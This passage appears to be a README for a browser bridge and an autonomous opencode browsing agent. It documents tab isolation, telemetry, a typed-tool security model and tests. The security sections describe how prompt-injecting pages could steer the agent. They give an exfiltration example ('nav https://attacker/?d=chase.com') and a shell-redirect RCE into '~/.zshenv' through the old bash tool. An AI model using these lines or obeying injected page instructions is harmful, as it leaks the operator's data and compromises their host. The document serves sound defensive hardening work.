  **different** tabs never block each other.
- **Lifecycle (reversible — flag for veto).** Ownership has an idle TTL
  (`BROWSER_BRIDGE_OWNER_TTL`, default 900 s). On expiry the mapping is
  **released** so a dead session doesn't leak ownership, but the real Brave tab
  is deliberately **NOT closed** (never yank a visible tab out from under the
  user) — only an explicit `browser close` closes it.
- **Screenshot — CDP-primary, works on a background tab.** The **primary** path is
  **CDP `Page.captureScreenshot`** (via the `debugger` permission), which captures a
  BACKGROUND / occluded / non-foreground tab directly — so an owned/agent tab that is
  never foregrounded on the user's i3 tiling WM can still be screenshotted, and two
  profiles can each screenshot their own tab. `--fullpage` captures the whole
  scrollable document (CDP only). Attach is **refused on a privileged tab**
  (`assertCdpAttachable`) before any attach.
  - **`captureVisibleTab` fast path** — for a tab that is ALREADY the visible
    foreground tab (and not `--fullpage`), the SW uses the cheap, banner-free
    `captureVisibleTab` first; any failure there simply **falls through to the CDP
    path**. That fast path uses `captureWithRetry`, which **respects Chrome's ~2/sec
    `captureVisibleTab` quota** (retries spaced ≥~600ms; a
    `MAX_CAPTURE_VISIBLE_TAB_CALLS_PER_SECOND` hit waits a ~1s window) so a retry
    never re-trips the quota.
  - `text` / `html` / `eval` also read a background tab directly (no compositing
    needed), so for a pure read an agent/owned tab should read, not screenshot.
  - The transient-error classifier (`isTransientCaptureError` / `isCaptureQuotaError`)
    and the quota-spaced retry (`captureWithRetry`) are pure + unit-tested in
    `extension/protocol.js`; the capture itself needs real Brave, so it stays on the
    manual checklist. Like any `extension/` change, it only takes effect after a
    manual extension **reload** in `brave://extensions`.
- **Backward-compat.** A single session with no `open` (and even no
  `X-Session-Id`) behaves exactly as before: active-tab ops, no `tabId` injected.
  The multi-instance `--instance` targeting, ambiguity/supersede semantics, and
  telemetry are unchanged.

`GET /health` → `{"ok":true,"extension_connected":bool,"count":N,"extension_version_current":"<deployed-else-repo manifest>","extension_build_current":"<deployed-else-repo build_id.js>","instances":[{key,label,instanceId,activeTab,extension_version,extension_id,extension_build,extension_version_expected,extension_build_expected,extension_stale},…]}`.
Each instance carries its **loaded `extension_version`** (from the `X-Bridge-Ext-Version`
poll header; `null` until a build that reports it), its **`extension_id`** (from
`X-Bridge-Ext-Id`; `null` likewise — this is the path-derived
`chrome.runtime.id`, i.e. WHICH DIRECTORY was loaded), its **`extension_build`**
(from `X-Bridge-Ext-Build` — the BUILD MARKER of the code actually EXECUTING,
`null` on a build predating #324), both `_expected` values, and the explicit
**`extension_stale`** verdict (`true`/`false`/`null`=undecidable): `false`
requires two present, identical MARKERS and nothing else, so a marker missing on
either side **fails closed** — to `null`, except that two known but DISAGREEING
versions still decide `true`.
`extension_version_current` is the manifest the server expects Brave to have loaded
and `extension_build_current` the marker in the `build_id.js` beside it:
the deployed `~/.local/share/browser-bridge-ext/` copy, else the repo one.
`GET /instances` → `{"ok":true,"count":N,"instances":[…]}`.

## Telemetry (activity pipeline)

Each **handled command** (`getHtml`/`text`/`eval`/`tabs`/`nav`/`screenshot`/
`frames`/`click`/`type`/`key`/`wake`/`activate`, incl. its error/ambiguous outcomes) emits **one**
event into the personal activity-telemetry pipeline, so browser-skill usage is
first-class self-telemetry in ClickHouse `activity.events`:

- **`source="browser-bridge"`, `kind="cmd"`** — a *distinct* source from the
  collector's `browser` (nav/scroll) source; the two are kept separate.
- **Fields:** `text` = the active-tab bare **domain** (or the op when no domain),
  `duration_ms` = server-side latency, `exit_code` = 0/1, and a tiny `payload`
  JSON `{op, key, outcome[, domain]}` (`key` = the `--instance` routing target,
  empty for the implicit single-instance case; `outcome` ∈
  `ok|no_extension|ambiguous|unknown_instance|superseded|timeout`).
- **METADATA-ONLY (privacy):** it emits **only** the op name, instance key,
  outcome, latency, and the active tab's **bare domain** — **never** the eval
  source, page HTML, screenshot bytes/data-URLs, a full URL with path/query, or
  any page content. For the frame/input ops this specifically means **no frame URLs**
  (the `frames` result lists them to the caller, but telemetry keeps only the bare
  top-level domain), **no typed text** (`type`), and no click selector — the domain is
  derived only from the result's top-level `url`.
- **Best-effort / fire-and-forget:** emitting runs **after** the HTTP response is
  sent and can never delay or break a command — a missing collector, unwritable
  spool, or any exception is swallowed and the command still succeeds. No new
  deps: it reuses the collector's `scripts/collector/keylog/spool_emit.py`
  (single source of truth for the v1 line format), located by its stable
  absolute repo path (`~/workspace/devrc/…`) because `server.py` is deployed as a
  flat `/nix/store` symlink so `__file__` can't find the sibling collector tree.
- `health`/`instances`/`poll`/`result` are noise and deliberately do **not** emit.

Feeds the `activity.events` table (and, once its registry learns the source,
`adoption-scan`). The live end-to-end check (needs the running collector + real
Brave): run any `browser` command, then confirm a `source='browser-bridge'` row
landed in `activity.events`.

## opencode browser-agent (`browser agent "<goal>"`)

An **autonomous** read/navigate agent that offloads open-ended "go read X, tell
me Y" browsing off Claude's context onto a **cheap** model. `browser agent
"<goal>"` (→ the `browser-agent` wrapper) drives opencode headlessly against
DeepSeek `deepseek-v4-flash` (via OpenRouter) in the agent's OWN isolated Brave
tab and returns a compact structured result — never raw HTML.

```
browser agent "<goal>" [--instance K] [--allow-domains …] [--deny-domains …]
                       [--steps N] [--timeout S] [--dry-run]
```

**Flow (the wrapper, `browser-agent`):**

1. `open`s a NEW background tab on instance K **at `about:blank`** and captures
   its `tabId` (the agent's OWN tab — reuses the #175 `open`+`--tab` isolation),
   then **PROBES** it before spending a model token: a **non-injecting `browser
   tabs` listing** (pure `chrome.tabs` metadata — no `chrome.scripting`, no page
   content) that must contain the new `tabId`. Absent → the post-reload transient
   → close + re-open, bounded by `BROWSER_AGENT_READY_ATTEMPTS`/`_BACKOFF`. Any
   other probe error is a hard refusal.

   ⚠ **The probe must never inject.** It used to run `eval '1'`, which made
   `browser agent` **impossible to run**: `chrome.scripting` cannot inject into
   `about:blank` (no host permission covers it), so every single run died with
   `Cannot access contents of url "about:blank". Extension manifest must request
   permission to access this host.` before the model was ever invoked. The tab
   deliberately starts neutral — navigating it somewhere on startup would leak a
   request the caller never asked for and could trip `--allow-domains` — so
   readiness has to be answerable without page-content access. `tabs` is.
2. Runs `opencode run --format json -m openrouter/deepseek/deepseek-v4-flash
   --agent browser-agent --auto` in a scratch `--dir`, under a **wall-clock
   `--timeout` enforced with a PROCESS-GROUP kill** (`setsid` + `kill -<pgid>`, so
   no opencode child can survive a timeout — the old `timeout --kill-after` only
   killed the direct pid and could orphan a detached child).
3. **Parses opencode's final message** as the required schema
   `{"answer":str,"evidence":[str],"steps_used":int,"status":"ok|partial|blocked"}`.
   On a completed-but-malformed run it re-invokes **exactly once** (`--continue`,
   demanding ONLY the JSON); still malformed → returns `{"status":"blocked",…}`.
   No infinite retry. A hard opencode error (non-zero exit) or a `--timeout` kill
   → `blocked` with no retry.
4. Closes the owned tab on **every** exit path (success / timeout / error /
   tab-gone) — no leaked tabs.

**The action surface: ONE typed tool, NO shell (the PR #180 RCE fix).**

The agent's entire capability is a single **custom opencode tool**, `browser`
(`opencode/tools/browser.js` + its pure-logic sibling `browser_tool_impl.mjs`,
copied into the scratch project's `.opencode/tools/` per run). The model calls it
with TYPED arguments — `op` ∈ {`text`,`html`,`eval`,`nav`,`screenshot`,`frames`,
`click`,`type`,`key`,`wake`,`context`,`emulate`,`whoami`} plus optional `selector`/`url`/`js`/`text`/`key`/`frame`/
`maxBytes`/`waitMs` and the `emulate` fields (`device`/`width`/`height`/
`deviceScaleFactor`/`mobile`/`maxTouchPoints`/`userAgent`/`timezone`/`orientation`/
`colorScheme`/`reset`) — **never a shell command string, and never a raw-CDP `cdp`/`method`
field** (the CDP ops are bounded typed ops only; see the CDP security model above).

- **The agent's `whoami` is NARROWED — no cross-profile reconnaissance.** The
  server's `whoami_snapshot` iterates every live instance, so a bare passthrough
  would tell the autonomous model what the operator is browsing in *unrelated*
  profiles. The tool's summarizer therefore drops `activeTabDomain` outright (for
  every instance, including the agent's own) and lists only the agent's OWN forced
  instance (`BROWSER_AGENT_INSTANCE`, matched by key or label; an unmatched value
  yields an empty list rather than falling back to "all"). The git HEAD inside
  `server_version` is dropped too — only the version string survives. Why it
  matters: with no `--allow-domains` set, `hostDenied()` permits any host, so a
  leaked `{label:"banking", activeTabDomain:"chase.com"}` is one
  `nav https://attacker/?d=chase.com` away from exfil by a model that is by design
  reading prompt-injecting pages. This is the same leak that keeps `tabs` out of
  the agent's op set ("`tabs` would leak other tabs' URLs"); `whoami` had
  reintroduced a narrower version of it. The op's stated purpose — *which host and
  which profile am I on* — is fully intact. The `browser whoami` CLI is unchanged;
  the operator still sees everything.
- **`activate` is NOT in the agent's op set — and unlike `upload` it is not even
  opt-in reachable.** It is absent from `OP_TO_SERVER`, so no
  `BROWSER_AGENT_ALLOWED_OPS` value can turn it back on for the model. Reason:
  `activate` foregrounds the tab AND the server raises the Brave window via
  `i3-msg` — it TAKES THE OPERATOR'S SCREEN. Telemetry caught a driving session
  calling it **1–5 times per minute**, grabbing the screen on nearly every
  interaction while the operator was working. The capability the agent actually
  needed was *un-throttling*, which `wake` now provides without touching focus.
  Focus theft is a decision only a human at the machine should make, so it stays
  on the `browser` CLI. 🔴 As of 2026-08-18 this exclusion is no longer the only
  thing holding: the host-side raise is now OPT-IN server-side too (see *The focus
  steal is OPT-IN BY DEFAULT*), because an allowlist in one caller left every
  other caller unguarded — which is what the re-measurement found. That is a
  DEFAULT, not an authorization boundary — see that section's "what this IS and
  what it is NOT". (Deliberately a stronger stance than `upload`'s opt-in:
  `upload` is a risk an operator can knowingly accept for one run, whereas a model
  stealing the screen has no legitimate autonomous use at all.)
- **`upload` is NOT in the agent's op set** (11 ops, above — no `upload`). The
  `browser` CLI keeps it: an operator choosing a path by hand is a legitimate,
  audit-logged action. The autonomous model is different — it is by design pointed
  at untrusted, prompt-injecting pages, and `upload` takes a caller-chosen
  ABSOLUTE path with no allowlist, so a page could effectively pick the file whose
  contents get posted to it. It is therefore absent from all four places that
  define the agent's surface — `browser.js`'s typed `op` enum, `browser_tool_impl.mjs`'s
  `ALLOWED_OPS_DEFAULT`, the agent-md capability table, and this list — which
  `tests/browser_tool.test.mjs` parses and asserts identical, so they cannot drift.
  It stays REACHABLE for a deliberate opt-in via `BROWSER_AGENT_ALLOWED_OPS` (see
  the env-var table below); nothing depends on opencode's schema validation to
  enforce this, since whether an out-of-enum `op` is rejected before `execute()` is
  an unpinned implementation detail of opencode.

- **Why this replaced the bash tool.** The MVP gave the agent opencode's *bash*
  tool, permission-scoped to `browser --tab <id> *`. opencode denies by matching
  each shell *command* node against the deny rule, so chaining (`;`/`&&`/`|`/
  `$()`/backticks) was blocked — but a shell OUTPUT REDIRECTION
  (`browser --tab N eval '…' >> ~/.zshenv`) is **not a separate command node**: it
  attaches to the allowed `browser` command, so the wildcard glob matched it and
  the shell performed the redirect. A hostile page could induce the autonomous
  model to append attacker text to a sourced dotfile (`~/.zshenv`, sourced by
  every `zsh -c` incl. Claude's Bash tool) → **host RCE**. The raw-shell surface
  was the root cause; a typed tool eliminates it — there is no command string, so
  no `>`/`>>`/`;`/`|`/`$()`/backtick surface exists at all.
- **bash (and edit/read/webfetch/…) fully DENIED.** The per-run agent def
  (templated from `opencode/browser-agent.md`) sets `permission: {"*": deny,
  browser: allow}`. Verified with `opencode debug agent browser-agent`: the
  resolved tool set is `{bash:false, read:false, edit:false, write:false,
  webfetch:false, …, browser:true}` — only the typed tool is enabled.
- **Runtime fail-closed tool-set gate (this is what makes an unverified opencode
  version SAFE).** The denial above is a *property of the resolved config*, not
  something the wrapper can assume — a future opencode could resolve it
  differently. So BEFORE opening a tab or spending a single model
  token, the wrapper runs `opencode debug agent browser-agent` (a **read-only,
  model-free config dump**) in the scratch project and parses the resolved `tools`
  map. It **refuses to run** (`die`, non-zero, model never invoked) unless
  `browser:true` **AND** every host tool (`bash`/`read`/`edit`/`write`/`webfetch`)
  is present **AND** `false`. Any uncertainty fails closed: unparseable output, a
  missing `browser` (custom tool not loaded on an unsupported version), a host
  tool still `true`, **or** a host tool absent from the output (absence must not
  read as "disabled"). This turns the version-skew from a latent "runs unconfined"
  landmine into a loud, safe refusal — on any opencode where the host-tool denial
  did not take, `browser agent` refuses rather than running the model with a shell.
  Because the gate runs **before** the tab is opened, a gate failure leaks no tab.

  *Prerequisite:* an opencode whose `debug agent` reports a browser-only tool set.
  **Both hosts run 1.18.16 and both resolve browser-only** (verified: the dump
  parses to exactly one enabled tool, `browser`). There is no version-skew caveat
  here any more. The hosts CONVERGED on 2026-08-15 — `ship.sh` verified at the
  consumer, both `readlink -f $(command -v opencode)` resolving to the same
  `…-opencode-1.18.16` store path — so the pin and the deploy now agree. The
  browser-only resolution was measured identical on 1.18.4 and 1.18.16, so the
  bump did not change it. 🔴 The RAW dump is NOT byte-stable, on either binary: the
  `permission` array's order follows a directory walk and varies run to run, so
  `cmp` on two dumps differs for reasons that have nothing to do with the version.
  Compare the resolved tool set, or canonicalise first. So the deploy gap does not
  reopen the version-skew question.

  *The failure mode that actually bites — capture the dump to a FILE, never a
  pipe.* opencode does not reliably flush stdout before exiting when stdout is a
  pipe, so a `$(opencode debug agent …)` command substitution can return a
  TRUNCATED prefix. Measured on these hosts: `debug skill` 65536 B via pipe vs
  293329 B via file (deterministic across 3 runs); `debug v2` 55276 / 55276 /
  6103 B across three identical pipe runs — two different cut points *and*
  run-to-run variance, i.e. a flush race on exit, not a fixed buffer cap.
  Truncated JSON is unparseable, so the gate correctly fails closed — but the
  refusal reads `unparseable debug-agent tool set: Unterminated string…`, which
  looks exactly like an unsupported-version problem and misdirects the diagnosis.
  The wrapper therefore redirects the dump to `$SCRATCH/gate.json` and parses the
  file; the same command that failed via `$(...)` parses cleanly to `['browser']`
  from a file. **Reproduce the gate the same way** — `opencode debug agent
  browser-agent > /tmp/gate.json` — never through a pipe. The wrapper's three
  refusal messages are deliberately distinct so you can tell them apart: *failed
  to RUN (non-zero exit)* vs *produced NO output* vs *output was UNPARSEABLE* vs
  *tool set is not browser-only*.
- **The model cannot choose the tab / instance / domain policy.** The wrapper
  FORCES them on the tool via env (`BROWSER_AGENT_TAB`/`_INSTANCE`/
  `_ALLOW_DOMAINS`/`_DENY_DOMAINS`/`_DRY_RUN`, + inherited `BROWSER_BRIDGE_*`).
  The tool reads the forced tab and posts it explicitly — an explicit `--tab`
  overrides the server's owned-tab routing, so the model can never target another
  tab. Enforcement (op allowlist + domain deny + forced tab) lives IN the tool
  (`browser_tool_impl.mjs`), unit-tested in `browser_tool.test.mjs`.
- **Non-http(s) nav schemes are DENIED.** A `nav` is refused before any bridge
  fetch unless its scheme is `http:`/`https:`. `file:`/`data:`/`about:`/
  `javascript:`/`chrome:`/`blob:`/… all have an empty hostname, so the host
  allow/deny gate would treat them as "no host → not gated" and let them slip past
  the operator's `--allow-domains` confinement (loading attacker HTML in the owned
  tab, running inline script, or — with the browser's file-URL toggle on — reading
  a local file). The refusal reason is `nav_scheme_denied:<scheme>`; an
  unparseable/schemeless target is refused too (`nav_scheme_denied:<none>`). This
  is a hard gate, independent of the allow/deny lists.
- **Domain deny is best-effort.** For http(s) navs the tool refuses a `nav` to a
  denied host (and scans an `eval` for a literal denied host), but it cannot see a
  page's own client-side redirect after an allowed nav — the bridge navigates and
  the tool only sees the op it issued. `--deny-domains` is defence in depth, not a
  guarantee; the real isolation is the own-tab lock. *Follow-up:* server-side
  enforcement against the tab's resolved post-nav URL would make it binding.
- The `browser` tool talks to the loopback bridge over HTTP directly (bearer +
  `Host: 127.0.0.1` + `X-Session-Id` + the forced `tab`) — **zero subprocess, zero
  shell**. A metadata-only audit line per op (`#173`) goes to a scratch
  `tool-audit.jsonl` (op + decision + host — never page content).

**Harness (the agent-md body):** a strict single-tool contract, "prefer `text`
over `html`", the step budget, the required final-answer schema, and the domain
rules — so a cheap model is reliable *by construction*.

**opencode JSON envelope (verified live, opencode 1.18.4):** `--format json`
emits **newline-delimited JSON events** (NOT one document): `{"type":"step_start",
…}`, `{"type":"text","part":{"type":"text","text":"…"}}`, `{"type":"step_finish",
"part":{…,"tokens":{…},"cost":…}}`. The assistant answer is in the `text` parts;
`browser-agent-parse.py` concatenates them and extracts the last balanced schema
object (defensively, so a future envelope change can't break the parse).

**Cost / latency (est.):** ~$0.005–0.008 and ~10–25 s per task on
`deepseek-v4-flash` (cold-start opencode can take longer — hence the generous
120 s default `--timeout`); vs ~$0.75+ and a context-burn if the same loop ran in
Claude. **Privacy:** the pages the agent reads go to OpenRouter/DeepSeek —
consciously accepted; don't route high-secret pages casually.

### Deploy (per host — operator step; NOT done by the wrapper)

The wrapper is self-contained EXCEPT it needs (1) `opencode` on PATH, (2) the
OpenRouter key already in opencode's auth store (`~/.local/share/opencode/auth.json`
on both hosts — do NOT add a key). It writes BOTH the per-run agent def AND the
typed tool into its scratch `--dir`, so a live run needs no global install. For
interactive use (`opencode --agent browser-agent`), also symlink the canonical def
**and** the tool into opencode's config dir:

```bash
mkdir -p ~/.config/opencode/agents ~/.config/opencode/tools
ln -sf ~/workspace/devrc/scripts/browser-bridge/opencode/browser-agent.md \
       ~/.config/opencode/agents/browser-agent.md
# BOTH tool files — browser.js is the tool; browser_tool_impl.mjs is its
# (non-tool) pure-logic sibling, imported by it. opencode globs `*.{ts,js}` so the
# .mjs is NOT registered as a tool, but it MUST sit alongside browser.js.
ln -sf ~/workspace/devrc/scripts/browser-bridge/opencode/tools/browser.js \
       ~/.config/opencode/tools/browser.js
ln -sf ~/workspace/devrc/scripts/browser-bridge/opencode/tools/browser_tool_impl.mjs \
       ~/.config/opencode/tools/browser_tool_impl.mjs
```

(The global def keeps the `__STEPS__`/`__MODEL__` placeholders — inert on its own;
the wrapper substitutes them per run.)

**opencode version.** The custom-tool mechanism (`.opencode/tools/*.js`,
`permission: {"*": deny, …}`) is **verified on 1.18.16, which is what BOTH hosts
run and what `flake.lock` pins** (measured identical on 1.18.4 before the bump) — `opencode debug agent
browser-agent` resolves to `bash:false … browser:true`
(exactly one enabled tool) on each, plus an end-to-end `opencode debug agent …
--tool browser` run against a fake bridge. The wrapper still writes the tool to
BOTH `.opencode/tools/` and `.opencode/tool/` as cheap insurance against a future
tool-dir rename. If you upgrade opencode and it stops resolving browser-only, the
runtime tool-set gate refuses the run — that is the intended, safe outcome; fix
the config or roll back rather than weakening the gate.

⚠ **When checking the gate by hand, redirect to a FILE.** `opencode debug agent … |`
/ `$(opencode debug agent …)` can return truncated output (flush race on exit — see
the tool-set-gate section above), which reads as an unsupported-version failure and
sends you down the wrong path. Always `> /tmp/gate.json` first.

**Env vars the agent layer reads** (all are operator/test seams — the MODEL can
set none of them; it only ever supplies typed tool args):

| var | default | what it does |
|---|---|---|
| `BROWSER_AGENT_ALLOWED_OPS` | *(unset → the 11-op `ALLOWED_OPS_DEFAULT`)* | space/comma list that REPLACES the agent's op allowlist wholesale. Narrows it (`"text,html"`) or deliberately re-enables an off-by-default op — this is the ONLY supported way to give the autonomous agent `upload` |
| `BROWSER_AGENT_OPENCODE` | `opencode` | the opencode binary (test seam) |
| `BROWSER_AGENT_BROWSER_BIN` | `./browser` | the `browser` CLI used for open/close/probe (test seam) |
| `BROWSER_AGENT_MODEL` | `openrouter/deepseek/deepseek-v4-flash` | model baked into the per-run agent def |
| `BROWSER_AGENT_TEMPLATE` | `opencode/browser-agent.md` | the agent-md template to instantiate |
| `BROWSER_AGENT_TOOL_DIR` | `opencode/tools` | dir holding `browser.js` + `browser_tool_impl.mjs` |
| `BROWSER_AGENT_KEEP_SCRATCH` | `0` | `1` keeps the per-run scratch dir (transcripts, `gate.json`, `tool-audit.jsonl`) for debugging |
| `BROWSER_AGENT_READY_ATTEMPTS` | `3` | open→readiness-probe retry budget |
| `BROWSER_AGENT_READY_BACKOFF` | `0.4` | seconds between readiness retries |
| `BROWSER_AGENT_TAB` / `_INSTANCE` / `_ALLOW_DOMAINS` / `_DENY_DOMAINS` / `_DRY_RUN` / `_AUDIT` / `_SESSION_ID` | *(set by the wrapper per run)* | the FORCED tab / instance / domain policy / dry-run / audit-log path / session id the tool reads. Not for hand-setting — the wrapper owns them |
| `BROWSER_BRIDGE_HOST` / `BROWSER_BRIDGE_PORT` | `127.0.0.1` / `8788` | the loopback bridge the tool POSTs to (inherited) |
| `BROWSER_BRIDGE_TOKEN_FILE` | `~/.config/browser-bridge/token` | bearer-token file the tool reads |

### Manual live check (the one step that needs real Brave + a real model — CANNOT run in CI)

The unit tests use a **mocked opencode/bridge** (no live model, no Brave — that
loop can't run in CI). Two deterministic checks CAN be run on a host with opencode
installed (no model, no Brave) and are the fastest way to confirm the security
contract after a change:

```bash
# (a) the agent is bash-DENIED and only the typed tool is enabled (resolve, no model):
S=$(mktemp -d); mkdir -p "$S/.opencode/agents" "$S/.opencode/tools"
sed -e 's/__STEPS__/12/g' -e 's#__MODEL__#openrouter/deepseek/deepseek-v4-flash#g' \
  scripts/browser-bridge/opencode/browser-agent.md > "$S/.opencode/agents/browser-agent.md"
cp scripts/browser-bridge/opencode/tools/browser.js \
   scripts/browser-bridge/opencode/tools/browser_tool_impl.mjs "$S/.opencode/tools/"
# NOTE the FILE redirect — a pipe/`$(...)` can truncate opencode's stdout (flush
# race on exit) and turn a healthy config into a bogus "unparseable" failure.
( cd "$S" && opencode debug agent browser-agent ) > "$S/gate.json"
python3 -c \
  'import json,sys; t=json.load(open(sys.argv[1]))["tools"]; assert t["bash"] is False and t["browser"] is True; print("OK: bash denied, only browser enabled")' "$S/gate.json"
# (b) the tool refuses a bad op / disowned tab (executes the tool, no model, no bridge):
( cd "$S" && opencode debug agent browser-agent --tool browser --params '{"op":"open"}' ) 2>&1 | grep op_not_allowed
```

To verify the **full** end-to-end (needs real Brave + a real model):

1. Deploy the agent def AND the tool (see Deploy above); `browser health` →
   `extension_connected:true`.
2. `browser agent "go to news.ycombinator.com and report the top 3 story titles"`.
3. Assert: a NEW background tab opened (NOT your active tab), it navigated +
   read via the typed `browser` tool, it returned the compact schema with 3
   titles, your active tab was untouched, and the tab was closed afterwards. Check
   the scratch `tool-audit.jsonl` records only op/decision metadata (no page text).

## Icon

A gruvbox-tinted **bridge / chain-link** glyph (blue loopback node linked to the
yellow browser node on a dark rounded field). Source is
`extension/icons/icon.svg`; the committed PNGs (`icon-16/32/48/128.png`) are
rasterised from it and wired into `manifest.json` (`icons` + `action.default_icon`).
Regenerate after editing the SVG:

```bash
cd extension/icons
nix-shell -p librsvg --run 'for s in 16 32 48 128; do rsvg-convert -w $s -h $s icon.svg -o icon-$s.png; done'
```

## Running the tests

```bash
# Python (server.py) — headless, no Brave, no network beyond loopback:
nix-shell -p python312Packages.pytest --run "pytest scripts/browser-bridge/tests"

# Extension protocol logic + CDP helpers + typed tool (pure, no chrome.* runtime):
nix-shell -p nodejs --run "node --test scripts/browser-bridge/tests/*.test.mjs"
```

`tests/fixtures/oopif-rig/` is NOT part of either suite — it is a pair of manual
live-verify fixtures (loopback-resolving registrable sites served by one `python3 -m
http.server`) reproducing **nested** cross-origin OOPIFs on demand, the only known
reliable way to exercise the CDP frame path against real Brave: **Check A** is a 3-domain
grandchild rig (and, by construction, the confirmation that OOPIF targets really are typed
`iframe` — if they weren't, the type filter would drop the grandchild and Check A would
fail); **Check B** is a 7-level alternating-2-domain "deep" rig that discriminates a
binding `OOPIF_MAX_DEPTH` from the untagged-`sessionId` degradation. Its README has the
serve command, both verify sequences with an expected-outcome table, and the ⚠
`vcap.me`-now-resolves-publicly warning.

The CDP (chrome.debugger) ops are covered deterministically without a real browser:
`tests/cdp_protocol.test.mjs` unit-tests the pure decision layer (attach-scope
refuse-before-attach, always-detach on success/error/detach-failure, frame
enumeration/resolution, key/coordinate math, injection-safe expression builders,
and the **SW-side CDP timeouts**: a hung attach/command/detach settles with a
`cdp_timeout:<phase>` error within a bounded budget — never wedging the poll loop
— a discarded/unloaded tab fails fast with `tab_discarded`, and the no-wedge
guarantee that the next op is still processed after a hung one);
`tests/browser_tool.test.mjs` proves the typed tool forces the own-tab, forwards
only whitelisted typed fields, and **drops any smuggled `cdp`/`method`/`params`
field** (the RCE-class regression guard); `tests/test_server.py` proves the new ops
are dispatched + tab-scoped, enforce required fields, forward `frame`/`selector`/
`text`/`key` verbatim, keep telemetry metadata-only (no frame URLs / typed text),
and count against the rate limit. The real chrome.debugger attach/detach behaviour
needs live Brave — see **Manual live check** below.

The Python suite (`tests/test_server.py`) also runs as part of
`scripts/run-tests.sh` (it's in the hermetic set). It covers: token gen + `0600`
perms, `401`/`403` gates (incl. the instance-scoped `/poll` + `/result`),
per-instance `/health` + `/instances`, a `/cmd` round-trip against an in-process
fake extension, `503`/`504` no-extension/timeout paths, unknown-op + bad-JSON
errors, request↔reply id correlation (incl. out-of-order), and the multi-instance
registry: routing by key, independent queues (no cross-delivery), the ambiguity
error, unknown-target, label-vs-auto-id key resolution, supersede-on-duplicate
(incl. an in-flight command resolving to `superseded` with no orphaned waiter,
the displaced poll returning the distinct `409 superseded` signal instead of the
idle `204`, and the supersede being logged exactly once per displacement — the
no-churn/livelock-fix contract), legacy no-handshake back-compat, and an icon
sanity check (each declared PNG exists and its IHDR size matches). It also covers
**session isolation**: `open` recording `(instance,session)->tabId`, two sessions
getting distinct ownership, ops routing to the owning session's tabId (and the
interleaved-two-sessions clobber test), the active-tab fallback + `--tab`
override, `close`/`release` (drop ownership; `close` dispatches a remove-shaped
command, `release` never touches the extension), `tabs` ownedTabId annotation,
per-tab FIFO serialization (same-tab commands serialize in arrival order,
different tabs don't block, a queued command still honours `cmd_timeout`), TTL
reclaim (injected clock — released, not closed), the `no_owned_tab` error, the
session id being routing-only (bearer/Host still enforced), and backward-compat
(single session, no open → unchanged active-tab dispatch). It also covers the
**self-heal + idempotency hardening**: an `owned_tab_gone` op dropping the stale
ownership (self-heal to active-tab) while an unrelated `--tab` gone tab does NOT
evict a healthy mapping, `close` clearing ownership even when the tab was already
gone, an idempotent double `open` returning the reused tab (no orphan) vs opening
fresh when the owned tab is gone, a malformed `tab` (list/dict/bool) returning a
clean `400 bad_tab` instead of a 500 (+ the `_coerce_tab`/`_is_tab_gone` helper
units), and an explicit `--tab` overriding owned-tab routing (the subagent
escape hatch). It also covers the **per-instance concurrency backstop**: the
token-bucket admission (burst passes then `rate_limited`, refill-over-fake-time
resume, cap-at-burst), the queue-depth cap (`queue_full` at `MAX_QUEUE`, drain
resumes), strict per-instance isolation (throttling A never throttles B), the
disable path (rate=0/max_queue=0 → unlimited), a rejected submit leaving NO
turnstile/waiter residue (no deadlock), the HTTP `429 rate_limited` + throttle
telemetry event (metadata-only, a COARSE non-reversible session hash — never the
raw id), the HTTP `429 queue_full`, that the production defaults never throttle a
normal small burst, and the `browser` CLI backing off (non-zero exit) on a 429.
It also covers the **`text` cheap-read op** (dispatched + tab-scoped like
getHtml; selector/maxBytes passthrough; the CLI subcommand's default/selector/cap
arg parsing; and telemetry staying metadata-only — the page text never emitted)
and the `normalizeText` whitespace-collapse + UTF-8-safe byte-cap (node).

The **`browser agent`** slice, all headless (NO live model, NO Brave, NO bridge):

- `browser_tool.test.mjs` (node) — the AUTHORITATIVE coverage for the TYPED-tool
  RCE fix (`opencode/tools/browser_tool_impl.mjs`, `fetchImpl`/`readToken` mocked):
  the op allowlist (open/close/tabs/release refused), the FORCED tab (the model
  cannot override it — there is no tab arg), domain deny on `nav` (+ allowlist mode
  + the best-effort `eval` scan), the request shape (bearer / `Host` / `X-Session-Id`
  / mapped op / forced tab / instance target), `text` selector+maxBytes, the
  dry-run intercept, an op-level bridge failure surfacing as a refusal, and the
  screenshot no-blob rule.
- `test_browser_agent_parse.py` (python) — the opencode-transcript → schema parser
  (real-shaped stream, tool-event ignore, embedded-in-prose, multi text-part
  concat, last-schema-wins, brace-in-string, no-JSON/missing-keys → none,
  loose-field normalization, exit codes).
- `test_browser_agent.py` (python, fake `opencode` + fake `browser` CLI) — the
  wrapper lifecycle + security wiring: arg parsing; own-tab open→close on EVERY
  exit path (success/timeout-kill/opencode-error/open-failure); the agent def
  DENYING bash and allowing ONLY the custom tool (`"*": deny` + `browser: allow`,
  no `browser --tab … *`, no `bash:`); the typed tool being copied into the scratch
  project; the wrapper FORCING tab/instance/domain policy on the tool via env; NO
  shell-string path remaining (no PATH shim, the task message points at the typed
  tool); the **process-group kill on timeout** (a fake opencode forks an
  inherited-group straggler → asserted reaped, no orphan); schema parse + EXACTLY
  ONE `--continue` retry then `blocked`, no-retry on a hard error.

Current totals (measured): **208 Python** + **229 node**, of which
`nested_oopif.test.mjs` is **43** — the nested-OOPIF (#211) coverage. It models a
**HOSTILE** page, not a cooperative one: worker/service-worker/page targets ignored, a
`new Worker(location.href)` target that shares the wanted frame's url neither shadowing it
nor forcing a denial-of-service `ambiguous_frame`, `chrome-extension:`/`file:`/`devtools:`/
`about:`/`data:`/`javascript:` children refused (and never descended into), foreign-tab
events dropped, an omitted `tabId` failing closed, the experimental `filter` param
failing soft, the wait ceiling holding while the descend queue stays non-empty, and the
untagged-`source.sessionId` degradation pinned to its ACTUAL behaviour. It also carries a
**live-failure regression set**: sub-session events with NO `tabId` still resolving a
grandchild via the parentage fallback (the run-#1 repro), the 7-level deep-rig shape
resolving at depth 5 and refusing at depth 6, an unknown parent session still rejected
(the fallback is not blanket trust), a present-but-foreign `tabId` still losing, and the
`cascade[…]` diagnostic's content + 20-entry cap. Plus a GRANDCHILD frame
resolving through TWO attach levels (the second `Target.setAutoAttach` asserted to be sent
ON the child's `sessionId`), a depth-3 cascade, the DIRECT-child single-level path
unchanged (regression), the depth cap, the target cap, a frame-spamming page staying
bounded, ambiguous duplicate-URL match → `ambiguous_frame`, a propagation timeout →
`frame_not_found:<url>`, an attach event arriving AFTER `setAutoAttach` resolved still
being caught, the listener removed on every path, and `upload --frame` on a grandchild
